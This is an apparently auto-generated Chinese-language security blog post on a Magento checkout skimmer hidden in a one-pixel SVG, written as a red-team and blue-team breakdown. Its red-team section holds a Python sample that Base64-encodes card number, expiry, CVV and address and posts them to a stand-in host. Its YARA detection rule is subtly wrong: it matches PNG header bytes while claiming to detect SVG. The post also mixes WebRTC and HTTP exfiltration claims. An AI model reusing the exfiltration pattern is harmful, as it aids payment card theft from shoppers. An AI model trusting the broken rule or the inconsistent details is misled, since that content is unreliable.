---
layout: post
title:  "Hackers use pixel-large SVG trick to hide credit card stealer"
date:   2026-04-09 01:29:50 +0000
categories: [security]
severity: critical
---

# 🚨 解析 Magento 電子商務平台的信用卡竊取攻擊
> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: Critical (CVSS: 9.8)
> * **受駭指標**: RCE (Remote Code Execution) 和信用卡信息竊取
> * **關鍵技術**: SVG 圖像隱藏、PolyShell 漏洞、WebRTC 数据外泄

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: PolyShell 漏洞允許未經驗證的代碼執行和帳戶接管，攻擊者可以利用此漏洞注入惡意代碼。
* **攻擊流程圖解**:
  1. 攻擊者利用 PolyShell 漏洞注入惡意代碼到 Magento 平台。
  2. 惡意代碼創建一個 1x1 像素的 SVG 圖像，並將信用卡竊取代碼嵌入其中。
  3. 當用戶點擊結帳按鈕時，惡意代碼攔截請求並顯示假的「安全結帳」覆蓋層。
  4. 用戶提交的信用卡信息被驗證並以 XOR 加密和 Base64 編碼的 JSON 格式外泄給攻擊者。
* **受影響元件**: Magento Open Source 和 Adobe Commerce 穩定版本 2 安裝。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要有 Magento 平台的管理權限或利用 PolyShell 漏洞注入惡意代碼。
* **Payload 建構邏輯**:

    ```
    
    python
    # 範例 Payload 結構
    payload = {
        "credit_card_number": "",
        "expiration_date": "",
        "cvv": "",
        "billing_address": ""
    }
    
    # 將 Payload 編碼為 Base64
    encoded_payload = base64.b64encode(json.dumps(payload).encode("utf-8"))
    
    # 將編碼的 Payload 外泄給攻擊者
    requests.post("https://example.com/collect", data=encoded_payload)
    
    ```
* **繞過技術**: 攻擊者可以使用 SVG 圖像隱藏惡意代碼，避免安全掃描器的檢測。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| 類型 | 值 |
| --- | --- |
| IP | 23.137.249.67 |
| Domain | example.com |
| File Path | /fb_metrics.php |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Magento_Credit_Card_Stealer {
        meta:
            description = "Magento 信用卡竊取惡意代碼"
            author = "Your Name"
        strings:
            $svg_image = { 89 50 4e 47 0d 0a 1a 0a }
            $javascript_code = { 6a 61 76 61 73 63 72 69 70 74 }
        condition:
            $svg_image and $javascript_code
    }
    
    ```
* **緩解措施**: 更新 Magento 平台到最新版本，移除惡意代碼，監控和阻止可疑請求。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **SVG (Scalable Vector Graphics)**: 一種矢量圖形格式，常用於網頁設計和圖像處理。
* **PolyShell**: 一種 Magento 平台的漏洞，允許未經驗證的代碼執行和帳戶接管。
* **WebRTC (Web Real-Time Communication)**: 一種網頁實時通信技術，允許網頁應用程序之間進行實時通信。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/hackers-use-pixel-large-svg-trick-to-hide-credit-card-stealer/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1190/)


